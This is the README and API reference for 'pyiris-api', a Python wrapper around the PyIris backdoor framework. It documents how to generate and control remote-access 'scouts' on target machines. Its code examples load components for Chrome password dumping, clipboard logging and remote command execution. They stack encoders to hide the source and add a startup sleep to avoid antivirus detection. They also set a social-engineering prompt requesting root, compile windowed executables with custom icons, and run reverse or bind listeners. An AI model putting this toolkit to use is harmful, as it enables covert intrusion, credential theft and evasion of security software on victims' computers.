# The PyIris Project - API
This is a version of PyIris packaged into an API. To access the implementation of this api, visit \<pyiris-api-implementation\>
For more information about PyIris as a whole, visit its official github page: \<pyiris\>

# Installation
```
pip install pyiris-api
```

# Official Documentation & Usage Guide
## Content:
Introduction:
- [Basic Usage](#Basic-Usage)
- [Global Variables](#Config-Variables)
- [Command Output Format](#Command-Output-Format)

Commands:

- [`pyiris.home`](#Home-Commands)

  - [`.add_to_list()`](#add_to_listlist_type-hostname)
  - [`.reset_list()`](#reset_listlist_type)
  - [`.remove_from_list()`](#remove_from_listlist_type,-hostname)
  - [`.set_list()`](#set_listlist_type-to_set)
  - [`.regen_key()`](#regen_keykeynone)
  - [`.show()`](#showlist_type)
  
- [`pyiris.generate`](#generator-commands)

  - [`.load_base()`](#load_basebase_id)
  - [`.base_info()`](#base_infobase_str)
  - [`.load_component()`](#load_componentcomponent_str)
  - [`.component_info()`](#component_infocomponent_str)
  - [`.unload_component()`](#unload_componentcomponent_str)
  - [`.load_encoder()`](#load_encoderencoder_str)
  - [`.encoder_info()`](#encoder_infoencoder_str)
  - [`.unload_encoder()`](#unload_encoderencoder_indexes)
  - [`.set_scout_values()`](#set_scout_valuesto_set-set_val)
  - [`.reset_scout_values()`](#reset_scout_valuesto_reset)
  - [`.show()`](#showto_show)
  - [`.generate()`](#generategenerator_settingsnone)

## Basic Usage
For a basic instance,
```py
from pyiris_api import PyIris

p = PyIris.Main() #Initialise an instance of the backdoor.
```

For verbose command output,
```py
from pyiris_api import PyIris

p = PyIris.Main(verbose=True) #Initialise an instance of the backdoor.
```

Use your own logging instead of the default print statements (To learn about logging_handlers: \<custom_logging_handlers\>),
```py
from pyiris_api import PyIris
import my_logging_handler

p = PyIris.Main(logging_handler=my_logging_handler.Main, verbose=True) #Initialise an instance of the backdoor.
```

## Config Variables:
Config variables in PyIris are the global variables initialised when the backdoor is initialised. Their default values are stored in pyiris_api/library/modules/config.py. Access them like so,
```py
from pyiris_api import PyIris

p = PyIris.Main()
p.config.myGlobalVar = "myGlobalVar"
print(p.config.myGlobalVar) # myGlobalVar
```

To initialise a config variable at startup, simply specify it in the parameters of the PyIris object like so,
Note: In the case you are defining a log_handler, include it as a parameter before defining any config variables
```py
from pyiris_api import PyIris

p = PyIris.Main(myGlobalVar="myGlobalVar")
```

## Command Output Format
Any command run by the PyIris object will have an output with a format as follows:
```py
{"status": "ok", "message": "This is a message", "data": None}
```
- `"status"` is a string which can have values `"ok"`, `"error"`, `"warning"`. It is used to check the status of the command.
- `"message"` is a string which will have a small description of the command output
- `"data"` will either be `None` or a dictionary containing useful command output.

## Home Commands:
These are the home commands of PyIris. Use these commands to manipulate the host whitelist, host blacklist and PyIris key.

Common Terms:
- Host Whitelist: 
- Host Blacklist:
- Key: This is a random key generated at startup and located in resources/PyIris.cred from wherever you run the api. It is used to verify scouts and prevent connections from any scouts which do not possess the key

#### `add_to_list(list_type, hostname)`
Adds a host to a list
```py
print(p.config.white_list) # []
output = p.home.add_to_list("whitelist", "192.168.1.7")
print(output) # {"status": "ok", "message": "Added 192.168.1.7 to whitelist", "data": {"whitelist": ["192.168.1.7"]}}
```

#### `reset_list(list_type)`
Resets a list
```py
print(p.config.white_list) # []
p.home.add_to_list("whitelist", "192.168.1.7")
print(p.config.white_list) # ["192.168.1.7"]
output = p.home.reset_list("whitelist")
print(output) # {"status": "ok", "message": "Reset Whitelist", "data": {"whitelist": []}}
```

#### `remove_from_list(list_type, hostname)`
Remove a host from a list
```py
print(p.config.white_list) # []
p.home.add_to_list("whitelist", "192.168.1.7")
p.home.add_to_list("whitelist", "192.168.1.8")
print(p.config.white_list) # ["192.168.1.7", "192.168.1.8"]
output = p.home.remove_from_list("whitelist", "192.168.1.7")
print(output) # {"status": "ok", "message": "Removed 192.168.1.7 from Whitelist", "data": {"whitelist": ["192.168.1.8"]}}
```

#### `set_list(list_type, to_set)`
Sets the value of a list. `to_set` must be a list.
```py
print(p.config.white_list) # []
output = p.home.set_list("whitelist", ["192.168.1.7, "192.168.1.8"])
print(output) # {"status": "ok", "message": "Set whitelist to ['192.168.1.7', '192.168.1.8']", "data": {"whitelist": ["192.168.1.7", "192.168.1.8"]}}
```

#### `regen_key(key=None)`
Randomly generates a key if `key` is `None`. Otherwise, sets the key to the value of `key`.
```py
output = p.home.regen_key()
print(output) # {"status": "ok", "message": "Successfully wrote new key", "data": {"key": "*********"}}
output = p.home.regen_key(key="thisIsAKey123321")
print(output) # {"status": "ok", "message": "Successfully wrote new key", "data": {"key": "thisIsAKey123321""}}
```

#### `show(list_type)`
`list_type` can be `"key"`, `"whitelist"`, "`blacklist`", `"all"`. It is used to display any of these parameters.
`"all"` will display the values of both the lists
```py
output = p.home.show("key")
print(output) # {"status": "ok", "message": "", "data": {"key": "*********"}}
output = p.home.show("whitelist")
print(output) # {"status": "ok", "message": "", "data": {"whitelist": []}}
```

## Generator Commands
These are the generator commands of PyIris which let you dynamically load modules and generate a deployable payload. It allows you to dynamically add and remove functionality to the deployable scout while supporting source code encryption and code compilation.

Common Terms:

- Scout: This is the deployable program which will connect to PyIris and execute commands on the target computer
- Components: These are loadable modules which give functionality to the deployable scout. They are referenced by their Ids
- Base: These are code bases upon which components are loaded. They essentially control the mode of connection and communication between PyIris and the payload.
- Encoders: These are programs which encrypt the scout's source code. They can be stacked
- Scout Options / Scout Values: These are generation options used to control generation. Here is a table with the names of the options and their defualt values

|Option|Default Value|Info|
|:---|:---|:---|
|Host|`p.config.private_ip`|The local hostname to connect back to (Reverse) or the interface to listen on (Bind). You can set multiple hostnames to connect back to by separating them with commas|
|Port|`'9999'`|The local port to connect back on (Reverse) or the remote port to listen on (Bind)|
|Timeout|`'5'`|The timeout value for the scout|
|Windows|`'True'`|When "True", will generate a windows scout, else a linux scout|
|Dir|`os.path.join(p.config.started_at, 'generated')`|Directory to generate payload in|
|Compile|`'False'`|When "True", will compile scout to EXE (windows) or ELF (Linux), else it will not compile|

Note: Shortcuts exist when loading modules by their IDs in bulk. This is a guide to format `component_str` and `encoder_str`. To load multiple components use "-" between the ID ranges of the components to load them. To load separate ID elements use "," to denote separate elements. Ranges can also be nested as elements. When loading components the final ID's will be formatted in order and stripped of duplicates, when loading encoders ID's of encoders remain in the order they originally were in duplicates remain since encoders can be stacked.
#### `load_base(base_id)`
This command loads a base by its id. Only a single base can be loaded.
```py
output = p.generate.load_base("0")
print(output) # {'status': 'ok', 'message': 'Replaced the loaded on base with new base : windows/bases/bind_tcp_base', 'data': {'loaded_base': 'windows/bases/bind_tcp_base'}}
```

#### `base_info(base_str)`
This command prints and provides detalied information about a/multiple loadable base(s)
(If `base_str` is `"all"`, information about all bases will be shown)
```py
output = p.generate.base_info("0")
print(output) # {'status': 'ok', 'message': 'Retrieved Base Info', 'data': {'base_info': {'0': {'Name': 'Bind TCP Base component', 'OS': 'Windows', 'Required Modules': 'socket, time', 'Commands': 'kill, ping, sleep <time>, disconnect', 'Description': 'The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands', 'Connection Type': 'Bind'}}}}
```

#### `load_component(component_str)`
This command loads components which will eventually be loaded onto the deployable scout.
(If `component_str` is `"all"`, all components will be loaded)
```py
output = p.generate.load_component("3-7")
print(output) # {'status': 'ok', 'message': 'Loaded components successfully', 'data': {'loaded_components': OrderedDict([('3', 'windows/control/chrome_password_dump'), ('4', 'windows/control/clip_logger'), ('5', 'windows/control/download_file'), ('6', 'windows/control/download_web'), ('7', 'windows/control/execute_command_cmd')])}}
```

#### `component_info(component_str)`
This command prints and provides detalied information about a/multiple loadable component(s)
(If `component_str` is `"all"`, information about all components will be shown)
```py
output = p.generate.component_info("3")
print(output) # {'status': 'ok', 'message': 'Retrieved Component Info', 'data': {'component_info': {'3': {'Name': 'Chrome password dump', 'OS': 'Windows', 'Required Modules': 'pypiwin32 (external), os', 'Commands': "chromedump ['active'|'passive']", 'Description': "Dumps chrome passwords. If 'active', kills chrome.exe first, if 'passive', will not run if chrome.exe is running"}}}}
```

#### `unload_component(component_str)`
This command unloads previously loaded components
(If `component_str` is `"all"`, all components will be unloaded)
```py
output = p.generate.unload_component("3,4")
print(output) # {'status': 'ok', 'message': 'Unloaded components successfully', 'data': {'loaded_components': OrderedDict([('5', 'windows/control/download_file'), ('6', 'windows/control/download_web'), ('7', 'windows/control/execute_command_cmd')])}}
```

#### `load_encoder(encoder_str)`
This command loads stackable encoders which will encode the scout's source code
(If `encoder_str` is `"all"`, all encoders will be loaded on once in the order of their indexes)
```py
output = p.generate.load_encoder("0,1,2")
print(output) # {'status': 'ok', 'message': 'Loaded encoders successfully', 'data': {'loaded_encoders': ['aes_stream_encoder', 'basic_base64_encoder', 'xor_cipher_encryption']}}
```

#### `encoder_info(encoder_str)`
This command prints and provides detailed information about a/multiple encoder(s)
(If `encoder_str` is `"all"`, information about all encoders will be displayed)
```py
output = p.generate.encoder_info("0")
print(output) # {'status': 'ok', 'message': 'Retrieved Encoder Info', 'data': {'encoder_info': {'0': {'Name': 'AES Encoder', 'Required Modules': 'cryptography', 'Description': 'Uses Fernet to AES encrypt the scout'}}}}
```

#### `unload_encoder(encoder_indexes)`
This command unloads encoders by index.
(If `encoder_str` is `"all"`, all encoders will be unloaded)
```py
p.generate.load_encoder("2,2,2")
output = p.generate.unload_encoder("0,1") # removing encoders at 1st and 2nd index
print(output) # {'status': 'ok', 'message': 'Unloaded encoders successfully', 'data': {'loaded_encoders': ['xor_cipher_encryption']}}
```

#### `set_option(to_set, set_val)`
This command allows you to set scout options. Valid options are defined in the table above
```py
output = p.generate.set_option("Compile", "True")
print(output) #{'status': 'ok', 'message': 'Set "Compile" to "True"', 'data': {'scout_values': {'Host': ['192.168.1.7', 'The local hostname to connect back to (Reverse) or the interface to listen on (Bind). You can set multiple hostnames to connect back to by separating them with commas'], 'Port': ['9999', 'The local port to connect back on (Reverse) or the remote port to listen on (Bind)'], 'Timeout': ['5', 'The timeout value for the scout'], 'Windows': ['True', 'When "True", will generate a windows scout, else a linux scout'], 'Dir': ['C:/***/***/***/generated', 'Directory to generate payload in'], 'Compile': ['True', 'When "True", will compile scout to EXE (windows) or ELF (Linux), else it will not compile']}}}
```

#### `reset_option(to_reset)`
This command resets one or all scout options back to default
(If `to_reset` is `"all"`, all scout options will be reset)
```py
output = p.generate.reset_option("all")
print(output) # {'status': 'ok', 'message': 'Reset all options', 'data': {'scout_values': {'Host': ['192.168.1.7', 'The local hostname to connect back to (Reverse) or the interface to listen on (Bind). You can set multiple hostnames to connect back to by separating them with commas'], 'Port': ['9999', 'The local port to connect back on (Reverse) or the remote port to listen on (Bind)'], 'Timeout': ['5', 'The timeout value for the scout'], 'Windows': ['True', 'When "True", will generate a windows scout, else a linux scout'], 'Dir': ['C:/***/***/***/generated', 'Directory to generate payload in'], 'Compile': ['False', 'When "True", will compile scout to EXE (windows) or ELF (Linux), else it will not compile']}}}
```

#### `show(to_show)`
This command prints and provides information about `"bases"`, `"components"`, `"encoders"`, `"loaded`" components & encoders, `"options"` (scout_values).
```py
output = p.generate.show("options")
print(output) # {'status': 'ok', 'message': '', 'data': {'scout_values': {'Host': ['192.168.1.7', 'The local hostname to connect back to (Reverse) or the interface to listen on (Bind). You can set multiple hostnames to connect back to by separating them with commas'], 'Port': ['9999', 'The local port to connect back on (Reverse) or the remote port to listen on (Bind)'], 'Timeout': ['5', 'The timeout value for the scout'], 'Windows': ['True', 'When "True", will generate a windows scout, else a linux scout'], 'Dir': ['C:/***/***/***/generated', 'Directory to generate payload in'], 'Compile': ['False', 'When "True", will compile scout to EXE (windows) or ELF (Linux), else it will not compile']}}}
```

#### `generate(generator_settings=None)`
This command generates a deployable PyIris scout to whatever `'Dir'` was specified in scout options.

`generator_settings` is an optional dictionary used to pass any extra options to specific components which require them. For example: pyiris_api/components/windows/control/execute_python.py may require extra imports which can be specified using
`generate(generator_settings={"execute_python_modules"=["flask", "numpy"]})`
Currently, only 5 components require extra options. Here they are:

|Component|Dictionary Key|Value Type|Info|Default|
|:---|:---|:---|:---|:---|
|windows/control/execute_python, linux/control/execute_python|`"execute_python_modules"`|list|A list of python modules which will be imported for executing remotely|`[]`|
|windows/startup/sleep, linux/startup/sleep|`"scout_sleep_time"`|int|Amount of time in seconds for scout to sleep on startup to avoid antivirus detection|`60`|
|linux/startup/req_root|`"request_root_message"`|str|A social engineering message to be displayed on startup to request for root|`"ERROR - This file must be run as root to work"`|

Another optional key present in `generator_settings` is `"compiler_settings"` which is a dictionary which controls compilation. Here are the valid keys and values in compiler_settings:

|Dictionary Key|Value Type|Info|Default|
|:---|:---|:---|:---|
|`"onefile"`|`bool`|Set `True` for compilation into one file, else `False`|`True`|
|`"windowed"`|`bool`|Set `True` if you don't want a console to display on execution, else `False`|`False`|
|`"custom_icon_filepath"`|`str`|Filepath to a .ico file so that the executable can have a custom icon|Default ico file|

```py
p.generate.load_base("0")
p.generate.load_component("all")
p.generate.load_encoder("0,1")
p.generate.set_option("Compile", "True")
output = p.generate.generate(generator_settings={"execute_python_modules": ["numpy", "flask", "cryptography"], "scout_sleep_time": 120, "compiler_settings":{"onefile": True, "windowed": True, "custom_icon_filepath": "C:/Path/To/Icon/icon.ico"}})
print(output) # {'status': 'ok', 'message': 'Generation and Compilation Successful', 'data': None}
```

## Listener Commands
These are the listener commands of PyIris which let PyIris connect to deployed and running scouts, either by running a listener or binding to the scout.

Common Terms:

- Listener: A socket listener which awaits connections from scouts with `reverse_tcp_base`s
- Listener Options / Listener Values: These are listener options used to control and customize listeners. Here is a table with the names of the options and their defualt values

|Option|Default Value|Info|
|:---|:---|:---|
|Interface|`'0.0.0.0'`|The local interface to start a listener|
|Port|`'9999'`|The local port to start a listener|
|Name|`'Listener'`|The name of the listener|
|Reply|`'Reply'`|The reply to send back in the case of a failed listener authentication/ connection|

#### `bind(host, port)`
This command allows you to bind to a scout with a `bind_tcp_base`
```py
output = p.listener.bind("192.168.1.7", 9999)
print(output) # {'status': 'ok', 'message': 'Connection Established to 192.168.29.139:9999', 'data': {'scout_database': {'0': ['192.168.29.139', '9999', '192.168.29.139:9999', 'L8m5o', '2021-02-04 19:39:33', 'Bind']}}}
```

#### `run_listener()`
This command allows you to initailaise a listener on the interface and port sepcified in `listener_values`
```py
output = p.listener.run_listener()
print(output) # {'status': 'ok', 'message': 'Started Listener', 'data': None}
```

#### `kill_listener(to_kill)`
This command allows to kill a listener by listener id
```py
output = p.listener.kill_listener("0")
print(output) # {'status': 'ok', 'message': 'Sent kill message to listener of ID : 0...', 'data': {'listener_database': {}}}
```

#### `set_option(to_set, set_val)`
This command allows you to set listener options. Valid options are defined in the table above.
```py
output = p.listener.set_option("Interface", "127.0.0.1")
print(output) # {'status': 'ok', 'message': 'Set "Interface" to "127.0.0.1"', 'data': {'listener_values': {'Interface': ['127.0.0.1', 'The local interface to start a listener'], 'Port': ['9999', 'The local port to start a listener'], 'Name': ['Listener', 'Name of the listener'], 'Reply': ['', 'The reply to send back in the case of a failed listener authentication/ connection']}}}
```

#### `reset_option(to_reset)`
This command resets one or all listener options back to default
(If `to_reset` is `"all"`, all listener options will be reset)
```py
output = p.listener.reset_option("Interface")
print(output) # {'status': 'ok', 'message': 'Reset all options', 'data': {'listener_values': {'Interface': ['0.0.0.0', 'The local interface to start a listener'], 'Port': ['9999', 'The local port to start a listener'], 'Name': ['Listener', 'Name of the listener'], 'Reply': ['', 'The reply to send back in the case of a failed listener authentication/ connection']}}}
```

#### `listener_info(to_show)`
This command prints and provides detailed information about 1 or all listeners
(If `to_show` is `"all"`, information abut all listeners will be shown)
```py
output = p.listener.listener_info("0")
print(output) # {'status': 'ok', 'message': '', 'data': {'listener_database': {'0': {'host': '0.0.0.0', 'port': '9999', 'name': 'Listener', 'created_at': 'YYYY-MM-DD HH:MM:SS', 'connections': ['192.168.1.7:42069']}}}}
```

#### `rename_listener(to_rename, rename_val)`
This command renames a listener
```py
output = p.listener.rename_listener("0", "Listener1")
print(output) # {'status': 'ok', 'message': 'Successfully renamed listener 0 to Listener1', 'data': None}
```

#### `show(to_show)`
This command prints and provides information about `"options"` and `"listeners"`.
```py
output = p.listener.show("listeners")
print(output) # {'status': 'ok', 'message': '', 'data': {'listener_database': {'0': {'host': '0.0.0.0', 'port': '9999', 'name': 'Listener', 'created_at': 'YYYY-MM-DD HH:MM:SS', 'connections': ['192.168.1.7:42069']}}}}
```
